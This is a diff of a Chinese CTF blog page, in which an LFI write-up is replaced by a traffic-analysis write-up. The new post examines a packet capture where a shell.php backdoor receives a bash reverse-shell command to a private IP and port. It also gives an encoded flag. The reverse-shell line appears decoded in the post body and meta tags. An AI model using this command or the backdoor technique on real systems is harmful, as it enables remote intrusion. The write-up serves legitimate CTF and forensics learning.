@@ -79,20 +79,20 @@
 
 
 
-<meta name="description" content="Global Page虽然已经完成了规定的Web题，但还是打算继续往下做作，这个题的考察点就是抓包尝试拼接+LFI。首先打开题目，然后点CTF抓个包观送进Repeater里观察一下。  发现Accept-Language的参数疑似被拼接到了要包含的文件中，再试一次，把Accept-Language的参数设置为flag发现确实被拼接进去了。那这道题的思路就很明确了，利用拼接和php:&#x2F;&#x2F;filter">
+<meta name="description" content="shell用Wireshark打开这个流量分析题，首先是一个arp解析，然后进行了三次握手，我最关注的是第五个http包，除了是http协议外，这个包还有shell.php，一副很可疑的样子。  对URI进行url解码： 1shell.php?cmd&#x3D;bash+-c+&#39;bash+-i+&gt;+&#x2F;dev&#x2F;tcp&#x2F;192.168.247.128&amp;#x2">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Global Page">
-<meta property="og:url" content="http://yoursite.com/2020/03/14/Global-Page/index.html">
+<meta property="og:title" content="shell">
+<meta property="og:url" content="http://yoursite.com/2020/03/17/shell/index.html">
 <meta property="og:site_name" content="RichardLEE&#39;s Blog">
-<meta property="og:description" content="Global Page虽然已经完成了规定的Web题，但还是打算继续往下做作，这个题的考察点就是抓包尝试拼接+LFI。首先打开题目，然后点CTF抓个包观送进Repeater里观察一下。  发现Accept-Language的参数疑似被拼接到了要包含的文件中，再试一次，把Accept-Language的参数设置为flag发现确实被拼接进去了。那这道题的思路就很明确了，利用拼接和php:&#x2F;&#x2F;filter">
-<meta property="og:image" content="http://yoursite.com/2020/03/14/Global-Page/1.png">
-<meta property="og:image" content="http://yoursite.com/2020/03/14/Global-Page/2.png">
-<meta property="article:published_time" content="2020-03-14T10:12:49.000Z">
-<meta property="article:modified_time" content="2020-03-14T10:38:34.786Z">
+<meta property="og:description" content="shell用Wireshark打开这个流量分析题，首先是一个arp解析，然后进行了三次握手，我最关注的是第五个http包，除了是http协议外，这个包还有shell.php，一副很可疑的样子。  对URI进行url解码： 1shell.php?cmd&#x3D;bash+-c+&#39;bash+-i+&gt;+&#x2F;dev&#x2F;tcp&#x2F;192.168.247.128&amp;#x2">
+<meta property="og:image" content="http://yoursite.com/2020/03/17/shell/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/17/shell/2.png">
+<meta property="article:published_time" content="2020-03-17T10:52:30.000Z">
+<meta property="article:modified_time" content="2020-03-17T11:12:50.290Z">
 <meta property="article:author" content="Richard LEE">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/2020/03/14/Global-Page/1.png">
+<meta name="twitter:image" content="http://yoursite.com/2020/03/17/shell/1.png">
 
 
 
@@ -122,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/03/14/Global-Page/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/03/17/shell/"/>
 
 
 
 
 
-  <title>Global Page | RichardLEE's Blog</title>
+  <title>shell | RichardLEE's Blog</title>
   
 
 
@@ -235,7 +235,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/14/Global-Page/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/17/shell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Richard LEE">
@@ -252,7 +252,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Global Page</h1>
+          <h1 class="post-title" itemprop="name headline">shell</h1>
         
 
         <div class="post-meta">
@@ -264,8 +264,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-14T18:12:49+08:00">
-                2020-03-14
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-17T18:52:30+08:00">
+                2020-03-17
               </time>
             
 
@@ -302,11 +302,16 @@
       
 
       
-        <h2 id="Global-Page"><a href="#Global-Page" class="headerlink" title="Global Page"></a>Global Page</h2><p>虽然已经完成了规定的Web题，但还是打算继续往下做作，这个题的考察点就是抓包尝试拼接+LFI。首先打开题目，然后点CTF抓个包观送进Repeater里观察一下。</p>
-<p><img src="/2020/03/14/Global-Page/1.png" alt></p>
-<p>发现Accept-Language的参数疑似被拼接到了要包含的文件中，再试一次，把Accept-Language的参数设置为flag发现确实被拼接进去了。那这道题的思路就很明确了，利用拼接和php://filter伪协议获取flag.php源码。</p>
-<p><img src="/2020/03/14/Global-Page/2.png" alt></p>
-<p>在GET参数中配置php:拼接/再拼接Accept-Language中的/filter/convert.base64-encode/resource=flag最后再拼接上.php就可以完成本地文件包含了，base64解码即可得到flag。</p>
+        <h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>用Wireshark打开这个流量分析题，首先是一个arp解析，然后进行了三次握手，我最关注的是第五个http包，除了是http协议外，这个包还有shell.php，一副很可疑的样子。</p>
+<p><img src="/2020/03/17/shell/1.png" alt></p>
+<p>对URI进行url解码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.php?cmd&#x3D;bash+-c+&#39;bash+-i+&gt;+&#x2F;dev&#x2F;tcp&#x2F;192.168.247.128&#x2F;12345+&lt;&amp;1+2&gt;&amp;1&#39;</span><br></pre></td></tr></table></figure>
+
+<p>做过渗透的话一眼就能看出来，shell.php应该是后门，然后利用这个后门做了bash反弹shell。第6个数据包是反弹shell之后的回显包，从第7个数据包开始是文件数据的交互，因此追踪第七个数据包的TCP流。</p>
+<p><img src="/2020/03/17/shell/2.png" alt></p>
+<p>这里利用了python的swapcase()函数对base64编码后的flag进行了大小写转换。将如下字符串进行大小写转换后base64解码即可得到flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zMXHz3TYzxzLCNnLx3nOzwWXBdfSBgWXBh0k</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
@@ -337,8 +342,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/03/14/Reverse-Sign-In/" rel="next" title="Reverse Sign In">
-                <i class="fa fa-chevron-left"></i> Reverse Sign In
+              <a href="/2020/03/16/RSA-babyBase-babyTirck%E5%88%9D%E5%B0%9D%E8%AF%95/" rel="next" title="RSA&babyBase&babyTirck初尝试">
+                <i class="fa fa-chevron-left"></i> RSA&babyBase&babyTirck初尝试
               </a>
             
           </div>
@@ -346,10 +351,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/03/15/Confusion1/" rel="prev" title="Confusion1">
-                Confusion1 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -472,7 +473,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Global-Page"><span class="nav-number">1.</span> <span class="nav-text">Global Page</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#shell"><span class="nav-number">1.</span> <span class="nav-text">shell</span></a></li></ol></div>
             
 
           </div>
